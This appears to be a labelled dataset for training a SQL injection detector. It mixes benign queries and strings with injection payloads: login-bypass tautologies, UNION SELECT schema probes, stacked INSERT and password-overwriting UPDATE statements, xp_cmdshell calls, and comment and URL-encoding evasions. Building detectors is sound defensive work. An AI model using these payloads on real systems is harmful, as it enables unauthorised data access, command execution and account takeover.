Sentence,Label
SELECT * FROM sun  WHERE me NOT LIKE '[mental]%',0
"'%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1131496#",1
admin' OR 1=1#/*120637/*993,1
"1"" UNION SELECT 1,2,3--/*",1
"' UNION SELECT 1,2,3----",1
989860000000000,0
admin' OR '1'='1946#540216,1
"1""+UNION+SELECT+NULL,table_name+FROM+information_schema.tables-- AND 1=1 AND 1=1",1
admin' OR 'a'='a200/*,1
'/**/OR/**/1=1-- OR 1=1 AND 1=1 OR 1=1 OR 1=1423,1
claudio iturrieta,0
"testadmin"" OR ""1""=""1 AND 1=1613186499360",1
1'----101-- OR 1=1,1
'+OR+1=1--156/*437902337,1
"admin"" UNION SELECT NULL,NULL,NULL--/*517 AND 1=1594--124/*",1
soldani-godet@informex.ru,0
SELECT * FROM stopped WHERE rear = 'writing' FETCH FIRST 3 ROWS ONLY,0
"test1"" UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=157437 OR 1=1",1
1' OR '1'='1' --#57 OR 1=1#892,1
"99'; INSERT INTO users VALUES('hacked','pass')--3728166756156",1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1 OR 1=1235",1
admin' UNION ALL SELECT NULL--24#732,1
SELECT * FROM pool WHERE relationship  BETWEEN 10 AND 20,0
' or 2=2----97334,1
SELECT TOP 3 * FROM clearly WHERE enjoy = 'capital',0
admin') OR 1=1----774#304597439,1
1'%20OR%201%20=%201575409713--493,1
')+OR+('1'='1 AND 1=1 OR 1=1#,1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311--598788",1
288508000000000,0
"1'; INSERT INTO users VALUES('hacked','pass')--739# AND 1=1 OR 1=1",1
aseguir,0
"1"" OR 1=1/*# OR 1=1/* AND 1=1/*",1
"admin"" OR 1=1#/*32775--",1
SELECT *,0
admin0x27/*318,1
""" or 2=2/* AND 1=1#61075",1
"1"" UNION SELECT NULL----159334593107278",1
"admin"" UNION ALL SELECT NULL--2412747416167",1
SELECT DISTINCT announced FROM next,0
'/**/OR/**/'1'='1'/**/--/*75157 OR 1=135,1
SELECT * FROM these WHERE due = 'one' FETCH FIRST 3 ROWS ONLY,0
"user"") OR (""1""=""1--167387#/*",1
"admin' UNION SELECT NULL,NULL,NULL--#",1
'; UPDATE USERS SET PASSWORD='HACKED'--69164 AND 1=1690,1
aedma@quadernideilgarda.ci,0
admin' OR 1=1-- AND 1=1173243,1
"  SELECT coffee,band FROM tonight WHERE willing = 'sale' UNION SELECT merely, carbon FROM extra",0
';%20EXEC%20xp_cmdshell('dir')--591 AND 1=1108/*##48--689,1
SELECT orbit ( s )  FROM orange FULL OUTER JOIN,0
"user"" OR 1=1/*--/*",1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1812 AND 1=1853657935",1
""";%09EXEC%09xp_cmdshell(""dir"")-- AND 1=1457",1
"test1"" OR ""1"" = ""1/*# AND 1=1--631/*/*/*",1
SELECT option_value FROM wp_options WHERE option_name  =  'options_contact_email' LIMIT 1,0
SELECT * FROM word WHERE is BETWEEN education09/01/1996elephant AND twelve15/31/1996cut,0
admin'%20OR%20'1'='1 AND 1=1 OR 1=1673,1
35591968c,0
' OR '1'='1' -- AND 1=1,1
